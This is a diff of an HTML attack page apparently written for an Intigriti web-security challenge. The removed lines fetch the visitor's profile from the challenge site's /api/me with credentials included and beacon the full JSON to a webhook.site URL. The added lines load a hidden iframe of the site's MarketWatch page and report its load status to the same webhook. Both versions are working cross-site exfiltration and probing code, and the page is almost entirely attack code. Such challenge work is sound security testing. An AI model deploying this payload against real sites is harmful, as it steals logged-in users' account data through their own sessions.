@@ -2,35 +2,22 @@
 <html>
 <body>
 <script>
-/*
-  Diagnostic PoC
-  Purpose: read current user profile (name / nickname)
-*/
-
 const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
-(async () => {
-  try {
-    const res = await fetch(
-      "https://challenge-0126.intigriti.io/api/me",
-      { credentials: "include" }
-    );
+// Try to load MarketWatch page
+const iframe = document.createElement("iframe");
+iframe.src = "https://challenge-0126.intigriti.io/marketwatch.html";
+iframe.style.display = "none";
 
-    const data = await res.json();
+iframe.onload = () => {
+  new Image().src = WEBHOOK + "?stage=marketwatch_page_loaded";
+};
 
-    // Send entire profile object for inspection
-    new Image().src =
-      WEBHOOK +
-      "?stage=me_dump&data=" +
-      encodeURIComponent(JSON.stringify(data));
+iframe.onerror = () => {
+  new Image().src = WEBHOOK + "?stage=marketwatch_page_error";
+};
 
-  } catch (e) {
-    new Image().src =
-      WEBHOOK +
-      "?stage=error&msg=" +
-      encodeURIComponent(e.toString());
-  }
-})();
+document.body.appendChild(iframe);
 </script>
 </body>
 </html>
